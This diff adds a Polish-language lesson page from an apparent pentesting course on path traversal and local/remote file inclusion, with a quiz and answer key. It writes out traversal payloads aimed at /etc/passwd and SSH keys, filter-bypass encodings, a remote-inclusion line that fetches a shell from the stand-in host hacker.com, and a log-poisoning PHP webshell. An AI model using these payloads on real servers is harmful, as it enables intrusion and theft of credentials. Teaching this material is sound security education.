@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="pl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lekcja 12: Path Traversal (LFI) - Kurs Pentestera</title>
+
+    <link rel="stylesheet" href="style.css">
+
+    <style>
+        /* Akcent: Radioactive Yellow (System Files & Logs) */
+        :root {
+            --accent: #c6ff00;
+            --accent-glow: rgba(198, 255, 0, 0.3);
+        }
+
+        .path {
+            color: #00e5ff;
+            font-family: monospace;
+        }
+
+        .wrapper {
+            color: #ff4081;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <header>
+            <h1>PATH TRAVERSAL & LFI</h1>
+            <p>MODUŁ 12: Wycieczki po serwerze, /etc/passwd i Log Poisoning</p>
+        </header>
+
+        <!-- 1. MECHANIZM -->
+        <section>
+            <h2>> WYJŚCIE Z WIĘZIENIA (ROOT)</h2>
+            <p>Aplikacje webowe powinny mieć dostęp tylko do swojego folderu (np. <code>/var/www/html</code>). Path
+                Traversal to błąd, który pozwala "wyjść" wyżej i czytać pliki systemowe.</p>
+
+            <div class="card">
+                <h3>MAGICZNY CIĄG: ../</h3>
+                <p>W systemach Linux/Windows dwie kropki oznaczają "katalog wyżej".</p>
+                <p>Jeśli aplikacja robi tak (PHP):</p>
+                <pre><code>include("pages/" . $_GET['file']);</code></pre>
+
+                <p>A Ty wyślesz:</p>
+                <pre><code>?file=<span class="path">../../../../etc/passwd</span></code></pre>
+
+                <p>Serwer skleja to w: <code>pages/../../../../etc/passwd</code>. <br>System operacyjny ignoruje
+                    <code>pages/../</code> i otwiera plik z hasłami/użytkownikami.</p>
+            </div>
+        </section>
+
+        <!-- 2. LFI vs RFI -->
+        <section>
+            <h2>> LFI vs RFI</h2>
+            <p>Wyróżniamy dwa rodzaje tego ataku (Inclusion):</p>
+
+            <div class="card">
+                <h3>1. LFI (Local File Inclusion)</h3>
+                <p>Wczytujesz plik, który <strong>już jest</strong> na serwerze ofiary.</p>
+                <ul>
+                    <li><strong>Cele:</strong> Pliki konfiguracyjne (<code>wp-config.php</code>), pliki systemowe
+                        (<code>/etc/passwd</code>, <code>C:\Windows\win.ini</code>), klucze SSH
+                        (<code>/root/.ssh/id_rsa</code>).</li>
+                    <li><strong>Wrappers:</strong> Możesz użyć
+                        <code>php://filter/convert.base64-encode/resource=index.php</code>, aby odczytać kod źródłowy
+                        aplikacji (zakodowany w base64), zamiast go wykonywać.</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>2. RFI (Remote File Inclusion) - Rzadkie</h3>
+                <p>Zmuszasz serwer, by pobrał i wykonał skrypt z <strong>Twojego</strong> serwera.</p>
+                <pre><code>?file=http://hacker.com/shell.php</code></pre>
+                <p>Jeśli zadziała -> Masz RCE natychmiast. (Wymaga <code>allow_url_include=On</code> w PHP, co jest
+                    domyślnie wyłączone od lat).</p>
+            </div>
+        </section>
+
+        <!-- 3. ESKALACJA -->
+        <section>
+            <h2>> LOG POISONING (LFI -> RCE) ☠️</h2>
+            <p>Masz LFI, możesz czytać pliki. Ale chcesz <strong>wykonać kod</strong> (RCE). Jak to zrobić, jeśli nie
+                możesz wgrać pliku?</p>
+            <p>Musisz "zatruć" plik, który już tam jest (np. log serwera).</p>
+
+            <div class="card">
+                <h3>SCENARIUSZ ATAKU</h3>
+                <ol>
+                    <li><strong>Zlokalizuj logi:</strong> Przez LFI znajdujesz plik
+                        <code>/var/log/apache2/access.log</code>. Widzisz tam historię odwiedzin.</li>
+                    <li><strong>Wstrzyknij kod:</strong> Wysyłasz żądanie do serwera, zmieniając swój
+                        <strong>User-Agent</strong> na kod PHP:
+                        <pre><code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+                        Serwer zapisuje to w logu.
+                    </li>
+                    <li><strong>Odpal bombę:</strong> Przez LFI wczytujesz zatruty log:
+                        <pre><code>?file=/var/log/apache2/access.log&cmd=id</code></pre>
+                    </li>
+                    <li><strong>Efekt:</strong> Serwer parsuje plik logu, napotyka Twój kod PHP i go wykonuje. Masz
+                        Shell.</li>
+                </ol>
+            </div>
+        </section>
+
+        <!-- 4. BYPASSING -->
+        <section>
+            <h2>> OMIJANIE FILTRÓW</h2>
+            <p>Programiści próbują blokować <code>../</code>. Jak to obejść?</p>
+            <div class="card">
+                <ul>
+                    <li><strong>URL Encoding:</strong> <code>%2e%2e%2f</code> (../)</li>
+                    <li><strong>Double Encoding:</strong> <code>%252e%252e%252f</code> (Działa, jeśli serwer dekoduje
+                        input dwa razy).</li>
+                    <li><strong>Null Byte (Stare systemy):</strong> <code>../../etc/passwd%00</code> (Obcina
+                        rozszerzenie .php, które serwer dokleja na siłę).</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- CHECKLIST -->
+        <section>
+            <h2>CHECKLISTA / RED FLAGS</h2>
+            <div class="card checklist-card">
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>Parametry plikowe:</strong> `?page=`, `?file=`, `?lang=pl`, `?template=`. To główne
+                        cele LFI.</div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>Cookie z nazwą języka:</strong> Ciasteczko `lang=en` może być używane do inkludowania
+                        pliku `en.php`. Zmień na `../../../../etc/passwd`.</div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>Wyciek ścieżek w błędach:</strong> Jeśli widzisz błąd: `Failed to open stream:
+                        /var/www/html/include/...`, wiesz, gdzie jesteś w systemie.</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- QUIZ -->
+        <section id="quiz-section">
+            <h2>🎓 WERYFIKACJA WIEDZY</h2>
+            <div id="quiz-container"></div>
+        </section>
+
+        <footer>
+            <p style="text-align: center; margin-top: 50px; color: #555;">&copy; 2026 Kurs Pentestera | Moduł 12</p>
+        </footer>
+    </div>
+
+    <!-- DANE DO QUIZU -->
+    <script>
+        const quizData = [
+            {
+                question: "Co oznacza ciąg znaków '../' w systemach plików?",
+                options: [
+                    "Jest to komentarz.",
+                    "Oznacza katalog bieżący.",
+                    "Oznacza katalog nadrzędny (wyjście poziom wyżej).",
+                    "Oznacza katalog root."
+                ],
+                correct: 2,
+                explanation: "To fundament ataku Path Traversal. Używając wielokrotnego `../` wychodzisz z folderu aplikacji aż do głównego katalogu systemu (/)."
+            },
+            {
+                question: "Jaki jest główny cel ataku LFI (Local File Inclusion)?",
+                options: [
+                    "Usunięcie bazy danych.",
+                    "Odczytanie plików znajdujących się na serwerze (np. konfiguracyjnych, systemowych), do których użytkownik webowy nie powinien mieć dostępu.",
+                    "Przekierowanie użytkownika na inną stronę.",
+                    "Zwiększenie uprawnień w bazie SQL."
+                ],
+                correct: 1,
+                explanation: "LFI pozwala 'zajrzeć' do plików serwera. Często pierwszym celem jest `/etc/passwd` (użytkownicy) lub pliki konfiguracyjne z hasłami do bazy."
+            },
+            {
+                type: "scenario",
+                question: "Chcesz odczytać plik 'config.php', ale gdy robisz '?file=config.php', strona jest pusta (bo PHP się wykonał, zamiast wyświetlić). Jakiego triku (wrappera) użyjesz?",
+                options: [
+                    "php://input",
+                    "php://filter/convert.base64-encode/resource=config.php",
+                    "file://config.php",
+                    "http://config.php"
+                ],
+                correct: 1,
+                explanation: "To klasyk CTF-owy. Filtr Base64 sprawia, że serwer nie wykonuje kodu PHP, tylko zwraca jego zakodowaną treść. Ty ją sobie odkodujesz u siebie i zobaczysz hasła."
+            },
+            {
+                question: "Na czym polega atak 'Log Poisoning'?",
+                options: [
+                    "Na usunięciu logów, żeby zatrzeć ślady.",
+                    "Na wstrzyknięciu złośliwego kodu (np. PHP) do pliku logów (np. poprzez User-Agent), a następnie wczytaniu tego logu przez podatność LFI, co powoduje wykonanie kodu.",
+                    "Na wysłaniu zbyt dużej ilości logów (DoS).",
+                    "Na zmianie uprawnień pliku logów."
+                ],
+                correct: 1,
+                explanation: "To technika zamiany LFI (czytanie plików) w RCE (wykonywanie kodu). Serwer sam zapisuje Twój złośliwy kod w logu, a Ty go tylko 'inkludujesz'."
+            },
+            {
+                question: "Czym różni się LFI od RFI?",
+                options: [
+                    "LFI działa na Linuxie, RFI na Windowsie.",
+                    "LFI wczytuje pliki lokalne (z serwera ofiary), RFI wczytuje pliki zdalne (z serwera atakującego, np. przez http://).",
+                    "RFI jest bezpieczniejsze.",
+                    "Nie ma różnicy."
+                ],
+                correct: 1,
+                explanation: "Remote File Inclusion (RFI) jest potężniejsze, bo od razu ładujesz swojego webshella z zewnątrz. Jednak nowoczesne konfiguracje PHP domyślnie blokują RFI."
+            },
+            {
+                type: "scenario",
+                question: "Widzisz URL: 'index.php?lang=pl'. Zmieniasz na 'index.php?lang=../../../../etc/passwd'. Strona wyświetla: 'Warning: include(pl.php) failed'. Co powstrzymało atak?",
+                options: [
+                    "Firewall.",
+                    "Serwer dokleja rozszerzenie '.php' do Twojego inputu na końcu.",
+                    "Brak uprawnień.",
+                    "Plik nie istnieje."
+                ],
+                correct: 1,
+                explanation: "Kod backendu prawdopodobnie wygląda tak: `include($_GET['lang'] . '.php');`. Dlatego serwer szukał `/etc/passwd.php`, który nie istnieje."
+            },
+            {
+                question: "Jaki plik jest klasycznym celem testowym Path Traversal na systemach Windows?",
+                options: [
+                    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+                    "C:\\Windows\\win.ini",
+                    "C:\\Passwords.txt",
+                    "D:\\Games"
+                ],
+                correct: 1,
+                explanation: "Tak jak `/etc/passwd` na Linuxie, tak `win.ini` (lub `boot.ini` w starych systemach) jest standardowym plikiem, który zawsze istnieje i potwierdza podatność."
+            },
+            {
+                question: "Co robi Null Byte (%00) w starych wersjach PHP/Java?",
+                options: [
+                    "Zeruje licznik odwiedzin.",
+                    "Mówi systemowi, że tu kończy się ciąg znaków (String Terminator). Pozwalało to odciąć doklejane rozszerzenie (np. .php).",
+                    "Wywołuje błąd 500.",
+                    "Służy do spacji."
+                ],
+                correct: 1,
+                explanation: "W starszych systemach `passwd%00.php` był interpretowany jako `passwd`. Wszystko po Null Byte było ignorowane. (Naprawione w PHP 5.3.4+)."
+            },
+            {
+                type: "scenario",
+                question: "Próbujesz LFI, ale WAF blokuje ciąg '../'. Co możesz spróbować?",
+                options: [
+                    "Zrezygnować.",
+                    "Użyć kodowania URL (np. %2e%2e%2f) lub podwójnego kodowania (%252e%252e%252f).",
+                    "Wpisać spacje.",
+                    "Zmienić przeglądarkę."
+                ],
+                correct: 1,
+                explanation: "Filtry często dekodują input tylko raz. Jeśli wyślesz podwójnie zakodowany ciąg, filtr przepuści `%25...`, a backend zdekoduje to do `../` i wykona atak."
+            },
+            {
+                question: "Jak najlepiej zabezpieczyć się przed Path Traversal?",
+                options: [
+                    "Usuwać kropki z inputu.",
+                    "Używać ID zamiast nazw plików (np. ?file_id=1) mapowanych na sztywno w kodzie, lub stosować ścisłą Białą Listę (Allowlist) dozwolonych nazw plików.",
+                    "Uruchomić serwer jako root.",
+                    "Ukryć nazwy plików."
+                ],
+                correct: 1,
+                explanation: "Nigdy nie pozwalaj użytkownikowi decydować o ścieżce do pliku. Jeśli musisz - sprawdź, czy podana nazwa jest na krótkiej liście dozwolonych wartości (np. ['pl', 'en', 'de'])."
+            }
+        ];
+    </script>
+
+    <script src="quiz.js"></script>
+
+</body>
+
+</html>
